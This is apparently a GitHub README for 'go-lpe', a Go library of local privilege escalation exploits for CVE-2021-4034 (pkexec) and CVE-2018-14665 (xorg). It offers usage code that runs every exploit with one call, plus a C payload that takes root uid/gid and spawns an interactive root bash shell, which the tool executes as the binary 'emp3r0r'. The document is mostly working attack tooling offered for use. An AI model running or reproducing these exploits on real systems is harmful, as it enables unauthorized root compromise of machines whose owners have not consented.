# Go-LPE

A collection of LPE exploits written in Go

![image](https://user-images.githubusercontent.com/10167884/151522601-dc61ba4b-1144-4c57-a548-f9bddd17b96e.png)

## Exploits

| CVE        | Description                                                         | Link                                          |
| ---------- | ------------------------------------------------------------------- | --------------------------------------------- |
| 2021-4034  | pkexec exploit rewritten in pure Go that is based on blasty's poc   | https://haxx.in/files/blasty-vs-pkexec.c      |
| 2018-14665 | xorg (a demo) that works in environments with certain xorg versions | https://www.cvedetails.com/cve/CVE-2018-14665 |

## Get Started

```bash
go get -u -v github.com/jm33-m0/go-lpe
```

```go
package main

import (
    golpe "github.com/jm33-m0/go-lpe"
)

func main() {
    golpe.RunAll()
}
```

```c
// go:build ignore
//  +build ignore
// musl-gcc -static -s -o emp3r0r demo.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  puts("go-lpe has successfully got root!");
  setuid(0);
  seteuid(0);
  setgid(0);
  setegid(0);
  system("/bin/bash -i");
  return 0;
}
```

- Note that this tool tries to execute `./emp3r0r -replace`
- If you want it to execute other stuff, just write a wrapper
